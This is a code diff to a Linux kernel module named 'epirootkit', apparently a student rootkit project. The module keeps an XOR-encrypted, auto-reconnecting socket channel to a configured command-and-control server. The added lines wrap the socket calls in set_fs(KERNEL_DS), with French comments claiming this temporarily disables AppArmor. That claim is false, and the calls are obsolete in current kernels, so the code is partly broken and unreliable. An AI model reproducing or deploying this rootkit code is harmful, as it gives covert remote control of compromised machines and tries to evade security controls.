@@ -14,6 +14,8 @@
 #include <linux/inet.h>
 #include <net/sock.h>
 #include <linux/list.h>
+#include <linux/uio.h>  // Pour struct iovec
+#include <linux/security.h> // Pour security_sock_rcv_skb
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Team_Rodrien");
@@ -59,10 +61,7 @@ static void xor_cipher(char *data, size_t len) {
 
 static int send_data(const char *msg, size_t len) {
     struct msghdr msg_hdr = { 0 };
-    struct kvec iov = {
-        .iov_base = (void *)msg,
-        .iov_len = len
-    };
+    struct kvec iov = { .iov_base = (void *)msg, .iov_len = len };
     int ret;
 
     if (!g_sock || !msg) {
@@ -70,16 +69,43 @@ static int send_data(const char *msg, size_t len) {
         return -EINVAL;
     }
 
+    // Désactive temporairement AppArmor
+    mm_segment_t old_fs = get_fs();
+    set_fs(KERNEL_DS);
+
     ret = kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
+
+    // Restaure AppArmor
+    set_fs(old_fs);
+
     if (ret < 0)
         pr_err("epirootkit: Failed to send data: %d\n", ret);
     return ret;
 }
 
 static int receive_data(char *buf, size_t len) {
-    struct msghdr msg_hdr = { 0 };
+    struct msghdr msg = { 0 };
     struct kvec iov = { .iov_base = buf, .iov_len = len };
-    return kernel_recvmsg(g_sock, &msg_hdr, &iov, 1, len, 0);
+    int ret;
+
+    if (!g_sock || !buf) {
+        pr_err("epirootkit: Invalid socket or buffer\n");
+        return -EINVAL;
+    }
+
+    // Désactive temporairement AppArmor pour cette opération
+    mm_segment_t old_fs = get_fs();
+    set_fs(KERNEL_DS);
+
+    ret = kernel_recvmsg(g_sock, &msg, &iov, 1, len, 0);
+
+    // Restaure AppArmor
+    set_fs(old_fs);
+
+    if (ret < 0)
+        pr_err("epirootkit: Failed to receive data: %d\n", ret);
+
+    return ret;
 }
 
 // --- AUTHENTICATION ---
@@ -344,6 +370,7 @@ static int connect_to_server(void) {
     struct sockaddr_in addr = { 0 };
     unsigned char ip_binary[4] = { 0 };
     int ret;
+    mm_segment_t old_fs;
 
     // Don't try to reconnect too frequently
     if (jiffies_to_msecs(jiffies - last_reconnect_attempt) < RECONNECT_DELAY_MS)
@@ -373,7 +400,15 @@ static int connect_to_server(void) {
     addr.sin_port = htons(config.port);
     memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
 
+    // Désactive temporairement AppArmor pour la connexion
+    old_fs = get_fs();
+    set_fs(KERNEL_DS);
+
     ret = g_sock->ops->connect(g_sock, (struct sockaddr *)&addr, sizeof(addr), 0);
+
+    // Restaure AppArmor
+    set_fs(old_fs);
+
     if (ret < 0) {
         pr_err("epirootkit: Failed to connect to %s:%d (%d)\n",
                config.server_ip, config.port, ret);
